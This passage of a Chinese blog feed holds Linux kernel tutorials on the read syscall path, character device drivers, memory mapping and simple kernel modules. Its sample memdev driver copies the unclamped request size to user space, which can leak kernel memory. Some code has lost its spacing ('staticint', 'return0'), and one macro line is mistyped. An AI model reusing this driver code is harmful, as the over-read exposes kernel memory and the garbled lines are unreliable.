fget_light(fd, &amp;fput_needed);    if (file) {        loff_t pos = file_pos_read(file);        ret = vfs_read(file, buf, count, &amp;pos);//调用虚拟文件系统的read        file_pos_write(file, pos);        fput_light(file, fput_needed);    }    return ret;}</code></pre><p>关于SYSCALL_DEFINE3这个宏的解析大家可以去<a href="http://blog.csdn.net/p_panyuch/article/details/5648007" target="_blank" rel="noopener">http://blog.csdn.net/p_panyuch/article/details/5648007</a> 这篇文章查看，在此我就不分析了，我们继续找到vfs_read代码如下：</p><pre><code>  ssize_t vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos){    ssize_t ret;    if (!(file-&gt;f_mode &amp; FMODE_READ))        return -EBADF;    if (!file-&gt;f_op || (!file-&gt;f_op-&gt;read &amp;&amp; !file-&gt;f_op-&gt;aio_read))        return -EINVAL;    if (unlikely(!access_ok(VERIFY_WRITE, buf, count)))        return -EFAULT;    ret = rw_verify_area(READ, file, pos, count);    if (ret &gt;= 0) {        count = ret;        if (file-&gt;f_op-&gt;read)//我们的文件读函数指针不为空            ret = file-&gt;f_op-&gt;read(file, buf, count, pos);//执行我们驱动中的读函数        else            ret = do_sync_read(file, buf, count, pos);        if (ret &gt; 0) {            fsnotify_access(file);            add_rchar(current, ret);        }        inc_syscr(current);    }    return ret;}</code></pre><h2 id="过程总结"><a href="#过程总结" class="headerlink" title="过程总结"></a>过程总结</h2><p>通过上面的分析我们已经了解的read函数的调用基本过程，下面我们将read函数的调用过程在进行总结：</p><ul><li>寻找svc异常总体入口，并进入内核空间</li><li>取出系统调用的标号</li><li>根据系统调用标号，在sys_call_table中找到对应的系统调用函数</li><li>根据系统函数比如sys_read找到对应的虚拟文件系统的read            </li><li>虚拟文件系统在调用驱动的read。<br><br><br><br></li></ul>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
          <category> Linux内核分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux内核分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux内核分析（五）</title>
      <link href="/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%94%EF%BC%89/"/>
      <url>/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%94%EF%BC%89/</url>
      <content type="html"><![CDATA[<pre><code>* 1.字符设备驱动基础* 2.简单字符设备驱动实现* 3.驱动测试</code></pre><h1 id="字符设备基础"><a href="#字符设备基础" class="headerlink" title="字符设备基础"></a>字符设备基础</h1><h2 id="字符设备描"><a href="#字符设备描" class="headerlink" title="字符设备描"></a>字符设备描</h2><p>述结构在linux2.6内核中，使用cdev结构体描述一个字符设备，其定义如下：  </p><pre><code>struct cdev {    struct kobject kobj;/*基于kobject*/    struct module *owner; /*所属模块*/    const struct file_operations *ops; /*设备文件操作函数集*/    struct list_head list;    dev_t dev; /*设备号*/    unsigned int count; /*该种类型设备数目*/};</code></pre><p>上面结构中需要我们进行初始化的有ops和dev，下面我们会对这两个成员进行分析。<br>注：kobject结构是驱动中很重要的一个结构，由于其复杂性，我们现在不进行介绍，后面会详细介绍。</p><h2 id="设备号"><a href="#设备号" class="headerlink" title="设备号"></a>设备号</h2><h3 id="何为设备号"><a href="#何为设备号" class="headerlink" title="何为设备号"></a>何为设备号</h3><p>cdev结构体中dev成员定义了设备号，而dev_t则为U32类型的也就是32位，其中12位为主设备号，20位为次设备号。我们执行ls –l /dev/可看到下图，其中左边红框为主设备号，右边为次设备号<br><img src="\images\pasted-303.png" alt="upload successful"></p><h3 id="何为主设备号"><a href="#何为主设备号" class="headerlink" title="何为主设备号"></a>何为主设备号</h3><p>用来对应该设备为何种类型设备。（比如串口我们用一个数字识别，而串口有好几个）  </p><h3 id="何为次设备号"><a href="#何为次设备号" class="headerlink" title="何为次设备号"></a>何为次设备号</h3><p>用来对应同一类型设备下的具体设备。（用次设备号来具体区分是哪个串口）</p><h3 id="设备号相关操作"><a href="#设备号相关操作" class="headerlink" title="设备号相关操作"></a>设备号相关操作</h3><ul><li>通过主设备号和次设备号获取dev：dev = MKDEV(主，次);</li><li>通过dev获取主设备号：主 = MAJOR(dev);</li><li>通过dev获取次设备号：dev = MINOR(dev);</li></ul><h3 id="设备号分配"><a href="#设备号分配" class="headerlink" title="设备号分配"></a>设备号分配</h3><p>设备号的分配有两种方式，一种是静态的，另一种是动态的，下面一一分析</p><ul><li>静态分配：也就是程序员自己指定设备号，通过register_chrdev_region();函数向内核申请，可能会导致和内核已有的冲突，从而失败。</li><li>动态分配：通过 alloc_chrdev_region(); 函数向内核申请设备号。</li><li>释放设备号：通过 unregister_chrdev_region(); 释放申请到的设备号。</li></ul><h2 id="file-operations操作函数集"><a href="#file-operations操作函数集" class="headerlink" title="file_operations操作函数集"></a>file_operations操作函数集</h2><p>file_operations结构体中的成员函数在我们驱动开发过程中极为重要，其中的内容相当庞大，下面我们看看其定义：</p><pre><code>struct file_operations {    struct module *owner;/*拥有该结构的模块的指针，一般为THIS_MODULES*/    loff_t (*llseek) (struct file *, loff_t, int); /*用来修改当前文件的读写指针*/    ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);/*从设备读取数据*/    ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);/*向设备发送数据*/    ssize_t (*aio_read) (struct kiocb *, const struct iovec *, unsigned long, loff_t); /*初始化一个异步的读取操作*/    ssize_t (*aio_write) (struct kiocb *, const struct iovec *, unsigned long, loff_t); /*初始化一个异步的写入操作*/    int (*readdir) (struct file *, void *, filldir_t); /*只用于读取目录，对于设备文件该字段为NULL*/    unsigned int (*poll) (struct file *, struct poll_table_struct *);/*轮询函数，判断目前是否可以进行非阻塞的读取或写入*/    long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long); /* 不用BLK的文件系统，将使用此函数代替ioctl*/    long (*compat_ioctl) (struct file *, unsigned int, unsigned long); /* 代替ioctl*/    int (*mmap) (struct file *, struct vm_area_struct *);/*用于请求将设备内存映射到进程地址空间*/    int (*open) (struct inode *, struct file *);/*打开*/    int (*flush) (struct file *, fl_owner_t id); /*在进程关闭它的设备文件描述符的拷贝时调用; 它应当执行(并且等待)设备的任何未完成的操作. */    int (*release) (struct inode *, struct file *);/*关闭*/    int (*fsync) (struct file *, int datasync); /*刷新待处理数据*/    int (*aio_fsync) (struct kiocb *, int datasync); /*异步fsync*/    int (*fasync) (int, struct file *, int); /*通知设备FASYNC标志发生变化*/    int (*lock) (struct file *, int, struct file_lock *);/* 实现文件加锁*/    ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int); /*通常为NULL*/    unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long); /*在当前的进程地址空间找的一个未映射的内存段*/    int (*check_flags)(int); /*法允许模块检查传递给 fnctl(F_SETFL...) 调用的标志*/    int (*flock) (struct file *, int, struct file_lock *);/**/    ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int); /*由VFS调用，将管道数据粘贴到文件*/    ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int); /*由VFS调用，将文件数据粘贴到管道*/    int (*setlease)(struct file *, long, struct file_lock **);/**/    long (*fallocate)(struct file *file, int mode, loff_t offset,    loff_t len); /**/}</code></pre><p>上面结构体中的函数指针所指向的函数，在我们在进行open、write、read等系统调用的时候最终会被调用到，所以我们的驱动中想为应用层实现那种调用就要在此实现。</p><h2 id="字符设备驱动初始化"><a href="#字符设备驱动初始化" class="headerlink" title="字符设备驱动初始化"></a>字符设备驱动初始化</h2><p>我们通过上面的分析对设备号和操作函数集有了一定的了解下面我们来看字符设备驱动初始化，其主要步骤如下。</p><ul><li>分配cdev结构：有静态（直接定义）动态（cdev_alloc();）两种方式  </li><li>初始化cdev结构：使用 cdev_init(struct cdev <em>cdev, const struct file_operations </em>fops) 初始化  </li><li>驱动注册：使用 int cdev_add(struct cdev *p, dev_t dev, unsigned count)//count为该种类型的设备个数注册   </li><li>硬件初始化：阅读芯片手册进行硬件设备的初始化  </li><li>完成操作函数集：实现要用的操作（设备方法）  </li><li>驱动注销：使用 void cdev_del(struct cdev *p) 注销  </li></ul><h2 id="字符设备驱动模型及调用关系"><a href="#字符设备驱动模型及调用关系" class="headerlink" title="字符设备驱动模型及调用关系"></a>字符设备驱动模型及调用关系</h2><p>下面我通过一张图将字符设备的驱动结构、以及字符设备驱动与用户空间的调用关系进行展示：<br><img src="\images\pasted-304.png" alt="upload successful"></p><h2 id="遗漏知识"><a href="#遗漏知识" class="headerlink" title="遗漏知识"></a>遗漏知识</h2><p>我们内核空间和用户空间的数据交互要用到下面两个函数：  </p><ul><li>copy_from_user();//从用户空间读        </li><li>copy_to_user();//写入用户空间<br><br><br><br></li></ul><h1 id="简单字符设备驱动"><a href="#简单字符设备驱动" class="headerlink" title="简单字符设备驱动"></a>简单字符设备驱动</h1><p>实现经过上面的分析我们对字符设备有一定了解，下面我们来完成一个最简单的字符设备驱动。我只展示最主要的代码，整个项目工程在<a href="https://github.com/wrjvszq/myblongs.git欢迎大家关注。" target="_blank" rel="noopener">https://github.com/wrjvszq/myblongs.git欢迎大家关注。</a></p><h2 id="字符设备驱动编写"><a href="#字符设备驱动编写" class="headerlink" title="字符设备驱动编写"></a>字符设备驱动编写</h2><p>因为驱动本身就是一个内核模块，下面的字符设备驱动只实现了部分方法。</p><pre><code>#include&lt;linux/module.h&gt;#include&lt;linux/init.h&gt;#include&lt;linux/cdev.h&gt;#include&lt;linux/fs.h&gt;#include&lt;asm/uaccess.h&gt;#define MEM_SIZE 1024MODULE_LICENSE(&quot;GPL&quot;);struct mem_dev{    struct cdev cdev;    int mem[MEM_SIZE];//全局内存4k    dev_t devno;};struct mem_dev my_dev;/*打开设备*/int mem_open(struct inode *inode, struct file *filp){    int num = MINOR(inode-&gt;i_rdev);/*获取次设备号*/    if(num == 0){/*判断为那个设备*/        filp -&gt; private_data = my_dev.mem;/*将设备结构体指针复制给文件私有数据指针*/    }    return 0;}/*文件关闭函数*/int mem_release(struct inode *inode, struct file *filp){      return 0;}static ssize_t mem_read(struct file *filp, char __user *buf, size_t size, loff_t *ppos){    int * pbase = filp -&gt; private_data;/*获取数据地址*/    unsigned long p = *ppos;/*读的偏移*/    unsigned int count = size;/*读数据的大小*/    int ret = 0;    if(p &gt;= MEM_SIZE)/*合法性判断*/        return 0;    if(count &gt; MEM_SIZE - p)/*读取大小修正*/        count = MEM_SIZE - p;    if(copy_to_user(buf,pbase + p,size)){       ret = - EFAULT;    }else{        *ppos += count;        ret = count;    }    return ret;}static ssize_t mem_write(struct file *filp, const char __user *buf, size_t size, loff_t *ppos){    unsigned long p = *ppos;    unsigned int count = size;    int ret = 0;    int *pbase = filp -&gt; private_data;    if(p &gt;= MEM_SIZE)        return 0;    if(count &gt; MEM_SIZE - p)        count = MEM_SIZE - p;    if(copy_from_user(pbase + p,buf,count)){       ret = - EFAULT;    }else{        *ppos += count;        ret = count;    }    return ret;}/*seek文件定位函数*/static loff_t mem_llseek(struct file *filp, loff_t offset, int whence){    loff_t newpos;    switch(whence) {        case SEEK_SET:/*从文件头开始定位*/            newpos = offset;            break;        case SEEK_CUR:/*从当前位置开始定位*/            newpos = filp-&gt;f_pos + offset;            break;        case SEEK_END:            newpos = MEM_SIZE * sizeof(int)-1 + offset;/*从文件尾开始定位*/            break;        default:            return -EINVAL;    }     if ((newpos&lt;0) || (newpos&gt;MEM_SIZE * sizeof(int)))/*检查文件指针移动后位置是否正确*/         return -EINVAL;     filp-&gt;f_pos = newpos;     return newpos;}const struct file_operations mem_ops = {    .llseek = mem_llseek,    .open = mem_open,    .read = mem_read,    .write = mem_write,    .release = mem_release,};static int memdev_init(void){    int ret = -1;    /*动态分配设备号*/    ret = alloc_chrdev_region(&amp;my_dev.devno,0,1,&quot;memdev&quot;);    if (ret &gt;= 0){        cdev_init(&amp;my_dev.cdev,&amp;mem_ops);/*初始化字符设备*/        cdev_add(&amp;my_dev.cdev,my_dev.devno,1);/*添加字符设备*/    }    return ret;   }static void memdev_exit(void){    cdev_del(&amp;my_dev.cdev);    unregister_chrdev_region(my_dev.devno,1);}module_init(memdev_init);module_exit(memdev_exit);</code></pre><p><br><br><br></p><h1 id="驱动测试"><a href="#驱动测试" class="headerlink" title="驱动测试"></a>驱动测试</h1><p>经过上面的代码我们已经实现了一个简单的字符设备驱动，我们下面进行测试。（应用程序在<a href="https://github.com/wrjvszq/myblongs.git" target="_blank" rel="noopener">https://github.com/wrjvszq/myblongs.git</a> 上）</p><h2 id="加载内核模块"><a href="#加载内核模块" class="headerlink" title="加载内核模块"></a>加载内核模块</h2><p>我们使用 insmod memdev.ko 命令加载内核模块</p><h2 id="获取设备号"><a href="#获取设备号" class="headerlink" title="获取设备号"></a>获取设备号</h2><p>我们的设备号是动态申请到的，所以我们要通过下面的命令查看设备号<br>cat /proc/devices<br>找到我们的设备memdev的设备号<br><img src="\images\pasted-305.png" alt="upload successful"></p><h2 id="建立设备文件"><a href="#建立设备文件" class="headerlink" title="建立设备文件"></a>建立设备文件</h2><p>使用如下命令建立设备文件：<br>mknod /dev/文件名 c 主设备号次设备号<br>上面命令中文件名为我们在应用程序中打开的文件名<br>c代表字符设备主设备号为上一步找到的，我的位249<br>次设备号非负即可，但不能超过自己所创建的设备数。<br>比如我的就是 mknod /dev/memdev0 c 249 0  </p><h2 id="编译应用程序并测试"><a href="#编译应用程序并测试" class="headerlink" title="编译应用程序并测试"></a>编译应用程序并测试</h2><p>使用gcc对应用程序进行编译，然后先使用write对设备进行写入，在使用read对设备读取，完成测试。<br><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
          <category> Linux内核分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux内核分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux内核分析（四）</title>
      <link href="/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
      <url>/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
      <content type="html"><![CDATA[<pre><code>* 1.Linux进程管理子系统* 2.Linux网络子系统* 3.虚拟文件系统* 4.Linux设备驱动简介</code></pre><h1 id="Linux进程管理子系统"><a href="#Linux进程管理子系统" class="headerlink" title="Linux进程管理子系统"></a>Linux进程管理子系统</h1><p>在进程管理中最重要的就是进程的调度和进程的通信下面我们一一分析。</p><h2 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h2><p>进程调度使得多个进程增长CPU中“微观串行，宏观并行”的进行执行。进程调度处于系统的中心位置，内核中其他子系统都依赖于它。</p><h3 id="进程调度意义"><a href="#进程调度意义" class="headerlink" title="进程调度意义"></a>进程调度意义</h3><p>进程调度使得多个进程增长CPU中“微观串行，宏观并行”的进行执行。进程调度处于系统的中心位置，内核中其他子系统都依赖于它。</p><h3 id="进程的状态切换"><a href="#进程的状态切换" class="headerlink" title="进程的状态切换"></a>进程的状态切换</h3><p>Linux的进程在几个状态间进行切换，如下图展现了其切换关系。<br><img src="\images\pasted-300.png" alt="upload successful"></p><h3 id="进程调度策略"><a href="#进程调度策略" class="headerlink" title="进程调度策略"></a>进程调度策略</h3><p>Linux中常见的有以下：  </p><ul><li>SCHED_OTHER 分时调度策略。</li><li>SCHED_FIFO实时调度策略，先到先服务</li><li>SCHED_RR实时调度策略，时间片轮转</li></ul><h2 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h2><p>Linux支持进程间的多种通信机制，可以通过这些通信机制进行多个进程、多资源的互斥访问、进程间的同步和消息传递。  </p><h3 id="linux进程间通信方式"><a href="#linux进程间通信方式" class="headerlink" title="linux进程间通信方式"></a>linux进程间通信方式</h3><ul><li>管道：分为有名管道（用于同一系统间的任意进程）和无名管道（用于父子进程）</li><li>信号量</li><li>信号</li><li>消息队列</li><li>共享内存</li><li>套接字（socket）<br><br><br><br></li></ul><h1 id="Linux网络子系统"><a href="#Linux网络子系统" class="headerlink" title="Linux网络子系统"></a>Linux网络子系统</h1><p>Linux网络子系统提供了对各种网络标准的存取和各种硬件的支持。下图是其整体结构。其可以分为协议层和网络驱动程序，其中网络协议主要负责实现每一种可能的网络传输协议，而网络驱动程序负责与硬件通信。<br><img src="\images\pasted-301.png" alt="upload successful"><br><br><br><br></p><h1 id="Linux虚拟文件系统"><a href="#Linux虚拟文件系统" class="headerlink" title="Linux虚拟文件系统"></a>Linux虚拟文件系统</h1><p>Linux虚拟文件系统（VFS）隐藏了各种硬件的具体细节，为所有的设备提供了统一的接口，它是对各种文件系统的一个抽象，其实使用超级块super block存放文件系统相关信息，使用索引节点inode存放文件的物理信息，使用目录项dentry存放文件的逻辑信息，其整体架构如下。<br><img src="\images\pasted-302.png" alt="upload successful"><br><br><br><br></p><h1 id="Linux设备驱动简介"><a href="#Linux设备驱动简介" class="headerlink" title="Linux设备驱动简介"></a>Linux设备驱动简介</h1><p>上面的介绍很简单，仅仅是对这些子系统的概念什么的进行了简介，下面我们对linux设备驱动进行简单介绍。</p><h2 id="设备驱动分类"><a href="#设备驱动分类" class="headerlink" title="设备驱动分类"></a>设备驱动分类</h2><p>Linux分为下面三种基本设备。</p><h3 id="字符设备"><a href="#字符设备" class="headerlink" title="字符设备"></a>字符设备</h3><p>是一种<strong>按照字节</strong>来访问的设备，字符设备适用于大多数的简单硬件。常见的LED、按键等</p><h3 id="块设备"><a href="#块设备" class="headerlink" title="块设备"></a>块设备</h3><p>是一种以块（通常为512字节）为最小访问单位的设备，常见的硬盘、SD卡等。但在linux中对块没有大小限制，可以访问任意数目的字节。</p><h3 id="网络设备"><a href="#网络设备" class="headerlink" title="网络设备"></a>网络设备</h3><p>用来负责发送和接收报文的设备，比如网卡。<br><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
          <category> Linux内核分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux内核 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux内核分析（三）</title>
      <link href="/2018/10/16/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2018/10/16/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      <content type="html"><![CDATA[<pre><code>* Linux地址映射* Linux内存分配</code></pre><p>在分析今天的内容之前，我们先看一位大神做的内存管理图。其实这张图可以分为两个部分，一部分是地址映射，另一部分就是内存分配。<br><img src="\images\pasted-297.png" alt="upload successful"></p><h1 id="Linux地址映射"><a href="#Linux地址映射" class="headerlink" title="Linux地址映射"></a>Linux地址映射</h1><p>下面的分析我们依据上图进行分析，首先我们来看其最右边的地址分布图（当然这是虚拟空间）。其地址分布总的可以分为两个部分我们下面慢慢分析（基于32位处理器）。<br><img src="\images\pasted-298.png" alt="upload successful"></p><h2 id="用户空间（0-3G）"><a href="#用户空间（0-3G）" class="headerlink" title="用户空间（0~3G）"></a>用户空间（0~3G）</h2><p>空间简介其从0x00000000到0xBFFFFFFF共3GB的线性地址空间，每个进程都有一个独立的3GB用户空间，当然这是虚拟的空间。<br>如何转换为物理空间这一部分虚拟空间到物理空间的转换方法是我们以前在<a href="http://www.cnblogs.com/wrjvszq/p/4246634.html一文中分析过的MMU地址转换。" target="_blank" rel="noopener">http://www.cnblogs.com/wrjvszq/p/4246634.html一文中分析过的MMU地址转换。</a></p><h2 id="内核空间（3-4G）"><a href="#内核空间（3-4G）" class="headerlink" title="内核空间（3~4G）"></a>内核空间（3~4G）</h2><p>其从0xC0000000到0xFFFFFFFF共1GB大小，内核空间又可以根据映射方式的不同分为下面四块，我们一一分析  </p><h3 id="内核逻辑地址空间"><a href="#内核逻辑地址空间" class="headerlink" title="内核逻辑地址空间"></a>内核逻辑地址空间</h3><p><strong>空间简介</strong><br>其从0xC0000000到high_memory(图中896MB的地方)最大为896MB（也就是说这块空间有可能不满，但最大为896MB），当然是虚拟空间。<br>注：在此注意一下896MB我们一会在分析。<br><strong>如何转换为物理空间</strong><br>这一部分虚拟地址与物理内存中对应的地址只差一个固定偏移量（3G），如果内存物理地址空间从0x00000000地址编址，那么这个固定偏移量就是PAGE_OFFSET（如上图）。  </p><h3 id="Vmalloc空间"><a href="#Vmalloc空间" class="headerlink" title="Vmalloc空间"></a>Vmalloc空间</h3><p><strong>空间简介</strong><br>其地址没有严格的界限，这段空间既可以访问到我们的高端内存，也可以访问到低端内存。<br><strong>如何转换为物理空间</strong><br>不是通过简单的线性关系映射，在此不研究。  </p><h3 id="永久内核映射"><a href="#永久内核映射" class="headerlink" title="永久内核映射"></a>永久内核映射</h3><p><strong>空间简介</strong><br>其固定用来访问高端内存。<br><strong>如何转换为物理空间</strong><br>不是通过简单的线性关系映射，在此不研究。</p><h3 id="固定映射"><a href="#固定映射" class="headerlink" title="固定映射"></a>固定映射</h3><p><strong>空间简介</strong><br>其在系统初始化期间永久映射I/O地址空间，或者特殊的寄存器。</p><h2 id="遗留知识"><a href="#遗留知识" class="headerlink" title="遗留知识"></a>遗留知识</h2><p>在刚才我们前面的分析中我们留下了一些问题下面进行解释。  </p><h3 id="低端内存"><a href="#低端内存" class="headerlink" title="低端内存"></a>低端内存</h3><p>内核逻辑地址空间所映射的物理内存就是低端内存(实际物理内存的大小，但是小于896MB)</p><h3 id="高端内存"><a href="#高端内存" class="headerlink" title="高端内存"></a>高端内存</h3><p>低端内存地址之上的物理内存是高端内存（物理内存896MB之上）。</p><h3 id="896MB来由"><a href="#896MB来由" class="headerlink" title="896MB来由"></a>896MB来由</h3><p>Linux将内存分为内核空间和用户空间，其中内核空间中的0xC0000000~high_memory部分用来映射物理内存，但是我们还需要映射I/O空间和固定的寄存器，所以留出了high_memory~0xFFFFFFFF之间的地址来映射I/O空间和固定的寄存器，而在X86平台根据经验设定了这个high_memory为896MB。  </p><h1 id="Linux内存分配"><a href="#Linux内存分配" class="headerlink" title="Linux内存分配"></a>Linux内存分配</h1><p>通过上面的介绍我们对linux对内存的管理，以及地址的映射有了一个了解，下面我们来分析linux是如何进行内存分配的。<br><img src="\images\pasted-299.png" alt="upload successful"><br>通过上图我们可以分析出内存的分配过程：  </p><ul><li>由malloc、fork等系统调用和kmalloc、vmalloc申请得到虚拟内存。  </li><li>在我们使用该内存的时候，产生请页异常（kmalloc除外）  </li><li>从空闲的页框分配物理内存，和虚拟地址建立映射。  </li></ul><p>注：kmalloc申请空间是不用经过请页异常的，返回的虚拟地址已经对应了物理内存。Kmalloc可以分配到连续的物理内存，vmalloc分配的是非连续的物理内存。<br><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
          <category> Linux内核分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux内核 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux内核分析（二）</title>
      <link href="/2018/10/16/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2018/10/16/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      <content type="html"><![CDATA[<pre><code>* 1.Linux内核模块简介* 2.简单内核模块实现</code></pre><h1 id="Linux内核模块简介"><a href="#Linux内核模块简介" class="headerlink" title="Linux内核模块简介"></a>Linux内核模块简介</h1><h2 id="何为内核模块"><a href="#何为内核模块" class="headerlink" title="何为内核模块"></a>何为内核模块</h2><p>在上一篇博文中我们先通过内核配置，在配置的过程中我们对内核的组件进行了选择（当然这个选择决定了我们内核的大小），然后才生成了我们最终的内核，那么我们如果想添加组件，怎么办？<br>最笨的方法是对内核进行重新配置，然后在重新编译。这样的话岂不是说我加一个组件就得重新编译内核，这显然不是很科学的方法，其实我们的linux内核提供在运行时可进行扩展的特性，这意味着当系统启动并运行时，我们可以向内核添加或移除部分功能。<br>我们在运行时添加到内核中的代码就被成为动态可加载内核模块，我们简称为内核模块。  </p><h2 id="内核模块的相关操作"><a href="#内核模块的相关操作" class="headerlink" title="内核模块的相关操作"></a>内核模块的相关操作</h2><p>加载内核模块：insmod<br>卸载内核模块：rmmod<br>查看内核模块：lsmod  </p><h2 id="模块声明"><a href="#模块声明" class="headerlink" title="模块声明"></a>模块声明</h2><p>MODULE_LICENSE（“GPL”）：内核可以识别的许可证有GPL（任意版本GNU通用公共许可证）、GPL v2等<br>MODULE_AUTHOR（“作者”）：声明作者信息可以不用<br>MODULE_VERSION（“版本”）：声明版本信息也可以不用<br>MODULE_DESCRIPTION（“功能描述”）：声明模块功能，可不用  </p><h2 id="模块参数"><a href="#模块参数" class="headerlink" title="模块参数"></a>模块参数</h2><p>我们可以在加载内核模块的时候向其传递参数，以让同一代码达到不同的效果。当然我们的参数必须用module_param宏来声明具体如下：<br>module_param（name，type，perm）<br>name：变量名<br>type：数据类型内核支持模块参数类型有：bool、invbool（bool的发转，true变为false，false变为true）、charp（char类型指针值）、int、long、short、uint、ulong、ushort<br>perm：常见的访问许可值通常为S_IRUGO和S_IWUSR。通常情况下将他们按位或同时我们也可以用下面的宏声明数组：<br>        Module_param_array（name，type，num，perm） </p><h2 id="模块符号导出"><a href="#模块符号导出" class="headerlink" title="模块符号导出"></a>模块符号导出</h2><p>当一个模块要使用另一个模块的函数（变量）的时候，要使用EXPORT_SYMBOL（符号名）或者EXPORT_SYMBOL_GPL（符号名）来申明。<br>注：EXPORT_SYMBOL_GPL（）只适用于遵循GPL协议的模块  </p><h1 id="简单内核模块实现"><a href="#简单内核模块实现" class="headerlink" title="简单内核模块实现"></a>简单内核模块实现</h1><p>想必大家都记得我们在学习某种语言的时候，写的第一个程序大部分都是输出hello world，所以我接下来用我们刚才介绍的内核模块去完成hello world。</p><h2 id="内核模块编写"><a href="#内核模块编写" class="headerlink" title="内核模块编写"></a>内核模块编写</h2><p>通过上面部分内容的介绍，要完成第一内核模块不是很难，下面是自己的代码。</p><pre><code>#include&lt;linux/init.h&gt;#include&lt;linux/module.h&gt;MODULE_LICENSE(&quot;GPL&quot;);staticint hello_init(void){    printk(&quot;&lt;0&gt; hello world\n&quot;);    return0;}staticvoid hello_exit(void){    printk(&quot;&lt;0&gt; goodbye\n&quot;);}module_init(hello_init);//该宏在模块的目标代码中增加一个特殊的段，用于说明内核初始化函数所在的位置module_exit(hello_exit);//跟上面的宏对立</code></pre><h2 id="Makefile编写"><a href="#Makefile编写" class="headerlink" title="Makefile编写"></a>Makefile编写</h2><p>Makefile的编写也比较简单，要注意的地方代码中已经说明。</p><pre><code>obj-m := hello.oDIRS :=/smbshare/linux-2.6.39///此处路径为内核源码路径，该内核源码必须要经过编译，不然会报错all:make -C $(DIRS) M=$(PWD) modulesclean:rm -Rf*.o *.ko *.mod.c *.order *.symvers    </code></pre><p>经过了上面两个步骤，我们然后编译加载然后卸载我们的模块进行试验。<br>编译：<img src="\images\pasted-292.png" alt="upload successful"><br>加载：<img src="\images\pasted-293.png" alt="upload successful"><br>查看：<img src="\images\pasted-294.png" alt="upload successful"><br>卸载：<img src="\images\pasted-295.png" alt="upload successful"></p><h2 id="Printk函数简介"><a href="#Printk函数简介" class="headerlink" title="Printk函数简介"></a>Printk函数简介</h2><p>printk函数为内核打印函数，其和printf函数功能类似，不过比printf多了打印权限一共有8个级别，printk的日志级别定义如下（在include/linux/kernel.h中）：  </p><pre><code>#define KERN_EMERG    0 //紧急事件消息，系统崩溃之前提示，表示系统不可用#define KERN_ALERT    1 //报告消息，表示必须立即采取措施#define KERN_CRIT     2 //临界条件，通常涉及严重的硬件或软件操作失败#define KERN_ERR      3 //错误条件，驱动程序常用KERN_ERR来报告硬件的错误#define KERN_WARNING  4 //警告条件，对可能出现问题的情况进行警告#define KERN_NOTICE   5 //正常但又重要的条件，用于提醒#define KERN_INFO     6 //提示信息，如驱动程序启动时，打印硬件信息#define KERN_DEBUG    7 //调试级别的消息</code></pre><p>给大家推荐一个比较好用的工具，叫做exvim其将好多vim的工具进行了集成，个人感觉十分方便，就是换电脑什么的也不怕自己的配置丢失了。大家有兴趣的可以去<a href="http://exvim.github.io/" target="_blank" rel="noopener">http://exvim.github.io/</a> 了解。<br><img src="\images\pasted-296.png" alt="upload successful"><br><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
          <category> Linux内核分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux内核 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux内核分析（一）</title>
      <link href="/2018/10/16/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2018/10/16/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/</url>
